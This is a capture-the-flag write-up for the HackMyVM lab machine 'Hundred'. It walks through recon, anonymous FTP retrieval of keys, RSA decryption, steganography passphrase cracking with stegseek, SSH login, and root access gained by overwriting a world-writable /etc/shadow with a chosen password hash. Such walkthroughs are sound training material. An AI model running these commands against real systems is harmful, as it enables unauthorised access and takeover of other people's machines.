# Hundred

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| **Hundred** | **sml** | **Beginner** | **HackMyVM** |

**Summary:** Hundred is a beginner-level Boot2Root machine that focuses on information gathering, cryptographic decryption, and identifying critical system misconfigurations. The attack chain begins with Anonymous FTP Access to retrieve sensitive files, followed by RSA Decryption to reveal hidden web directories. Initial access to the user account is achieved through Steganography on a web asset and SSH Key Authentication. The final objective is completed via Privilege Escalation by exploiting a World-Writable `/etc/shadow` file.

---

### Recon

Looking up for target's machine:

```bash
┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ sudo arp-scan -l -I eth1
-----[SNIP]-----
192.168.100.8   08:00:27:8b:b6:06       PCS Systemtechnik GmbH
-----[SNIP]-----
```

Target: `192.168.100.8`

Find out what are the open ports

```bash
┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ nmap -sV -sC -p- 192.168.100.8
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 09:26 WIB
Nmap scan report for 192.168.100.8
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa [NSE: writeable]
| -rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem [NSE: writeable]
| -rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub [NSE: writeable]
|_-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt [NSE: writeable]
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 ef:28:1f:2a:1a:56:49:9d:77:88:4f:c4:74:56:0f:5c (RSA)
|   256 1d:8d:a0:2e:e9:a3:2d:a1:4d:ec:07:41:75:ce:47:0e (ECDSA)
|_  256 06:80:3b:fc:c5:f7:7d:c5:58:26:83:c4:f7:7e:a3:d9 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:8B:B6:06 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds
```

3 Ports were opened `21, 22, 80`.

I guess that's enough for me, I connected to `FTP` server first:

```bash
┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ ftp 192.168.100.8
Connected to 192.168.100.8.
220 (vsFTPd 3.0.3)
Name (192.168.100.8:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||52990|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Aug 02  2021 .
drwxr-xr-x    2 0        113          4096 Aug 02  2021 ..
-rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa
-rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem
-rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub
-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt
226 Directory send OK.
```

There are a lot of files, should read that file one by one hahaha

```bash
ftp> mget *
mget id_rsa [anpqy?]?
229 Entering Extended Passive Mode (|||26721|)
150 Opening BINARY mode data connection for id_rsa (435 bytes).
100% |**********************************************************|   435       78.69 KiB/s    00:00 ETA
226 Transfer complete.
435 bytes received in 00:00 (52.45 KiB/s)
mget id_rsa.pem [anpqy?]?
229 Entering Extended Passive Mode (|||22164|)
150 Opening BINARY mode data connection for id_rsa.pem (1679 bytes).
100% |**********************************************************|  1679      214.64 KiB/s    00:00 ETA
226 Transfer complete.
1679 bytes received in 00:00 (161.17 KiB/s)
mget id_rsa.pub [anpqy?]?
229 Entering Extended Passive Mode (|||56251|)
150 Opening BINARY mode data connection for id_rsa.pub (451 bytes).
100% |**********************************************************|   451       81.29 KiB/s    00:00 ETA
226 Transfer complete.
451 bytes received in 00:00 (57.06 KiB/s)
mget users.txt [anpqy?]?
229 Entering Extended Passive Mode (|||30611|)
150 Opening BINARY mode data connection for users.txt (187 bytes).
100% |**********************************************************|   187       28.62 KiB/s    00:00 ETA
226 Transfer complete.
187 bytes received in 00:00 (22.14 KiB/s)
ftp> exit
221 Goodbye.
```

After reading it, the `id_rsa` is just, idk. The others? Look quite good.

![alt text](image.png)

But in the `users.txt`, I suspected `hmv` was the user of the target.

![alt text](image-1.png)

The interesting fact is I can't login via ssh using `id_rsa.pem`. 
So I need another way. 

![alt text](image-2.png)

looking source code in the in the web, got me 2 interesting things.
I guess that was file that contain directory?

```bash
┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ wget http://192.168.100.8/h4ckb1tu5.enc
--2025-12-29 09:31:22--  http://192.168.100.8/h4ckb1tu5.enc
Connecting to 192.168.100.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 256 [application/octet-stream]
Saving to: ‘h4ckb1tu5.enc’

h4ckb1tu5.enc             100%[====================================>]     256  --.-KB/s    in 0s

2025-12-29 09:31:22 (23.9 MB/s) - ‘h4ckb1tu5.enc’ saved [256/256]


┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ file h4ckb1tu5.enc
h4ckb1tu5.enc: data
```

decrypt it using `id_rsa.pem` found earlier.

```bash
┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ openssl pkeyutl -decrypt -inkey id_rsa.pem -in h4ckb1tu5.enc -out secret.txt

┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ cat secret.txt
/softyhackb4el7dshelldredd
```

Another directory!

![alt text](image-3.png)

However, nothing useful inside, let's try to enumerate the dir.

```bash

┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ gobuster dir -u http://192.168.100.8/softyhackb4el7dshelldredd -w /usr/share/wordlists/dirb/common.txt -q
/id_rsa               (Status: 200) [Size: 1876]
/index.html           (Status: 200) [Size: 26]
```

There it is, got `id_rsa` of user `hmv`.

```bash
┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ wget http://192.168.100.8/softyhackb4el7dshelldredd/id_rsa -O id_rsa                           
--2025-12-29 09:39:37--  http://192.168.100.8/softyhackb4el7dshelldredd/id_rsa
Connecting to 192.168.100.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1876 (1.8K) [application/octet-stream]
Saving to: ‘id_rsa’

id_rsa                    100%[=====================================>]   1.83K  --.-KB/s    in 0s  

2025-12-29 09:39:37 (222 MB/s) - ‘id_rsa’ saved [1876/1876]
```

Time to login!

```bash
┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ ssh hmv@192.168.100.8 -i id_rsa                                                                
The authenticity of host '192.168.100.8 (192.168.100.8)' can't be established.
ED25519 key fingerprint is SHA256:CiCK/UJWUULl80syMwfpY3+G25hq7fX/xTkHA61y2Ws.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:35: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.8' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```
But it asking for passphrase, and i dont know.

Back to this page, looks like `logo.jpg` is downloadable

![alt text](image-4.png)

```bash

┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ wget http://192.168.100.8/logo.jpg
--2025-12-29 12:20:16--  http://192.168.100.8/logo.jpg
Connecting to 192.168.100.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7277 (7.1K) [image/jpeg]
Saving to: ‘logo.jpg’

logo.jpg                 100%[========================================>]   7.11K  --.-KB/s    in 0s   

2025-12-29 12:20:16 (410 MB/s) - ‘logo.jpg’ saved [7277/7277]
```

This like an usual photo but there is hidden information if we provide the right cred.

Using `stegseek` found the passphrase for the key

```bash

┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ stegseek logo.jpg users.txt -xf output.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "cromiphi"
[i] Original filename: "toyou.txt".
[i] Extracting to "output.txt".


┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ cat output.txt
d[REDACTED]1
```

Login

```bash
┌──(kali㉿kali)-[~/hackmyvm/machines/Hundred]
└─$ ssh hmv@192.168.100.8 -i id_rsa
Enter passphrase for key 'id_rsa':
Linux hundred 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug  2 06:43:27 2021 from 192.168.1.51
hmv@hundred:~$ id
uid=1000(hmv) gid=1000(hmv) groups=1000(hmv),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

that's felt good.

### PrivEsc

After identifying what's route i could use to do privilege escalation, there is one thing interesting:
```bash
hmv@hundred:~$ ls -la /etc/passwd
-rw-r--r-- 1 root root 1444 Aug  2  2021 /etc/passwd
hmv@hundred:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
hmv@hundred:~$ ls -la /etc/shadow
-rwxrwx-wx 1 root shadow 963 Aug  2  2021 /etc/shadow
```

from that permission of `/etc/shadow`, I could overwrite and change the root password.

```bash
hmv@hundred:~$ openssl passwd -6 "qwertyuiop"
$6$T938vgSXWXesL03x$V3dM.McgTMmFa8tPTXYPu6GHWzNCAaayeeEKca4.Iqdtc7ZdjXp.SCYhsu2tWiOnTXKawG3h8K3HiVVOpSMMU/
hmv@hundred:~$ echo 'root:$6$T938vgSXWXesL03x$V3dM.McgTMmFa8tPTXYPu6GHWzNCAaayeeEKca4.Iqdtc7ZdjXp.SCYhsu2tWiOnTXKawG3h8K3HiVVOpSMMU/:20451:0:999999:7:::' > /etc/shadow
hmv@hundred:~$ su - root
Password:
root@hundred:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hundred:~# cat root.txt /home/hmv/user.txt
HMV[REDACTED]
HMV[REDACTED]
```
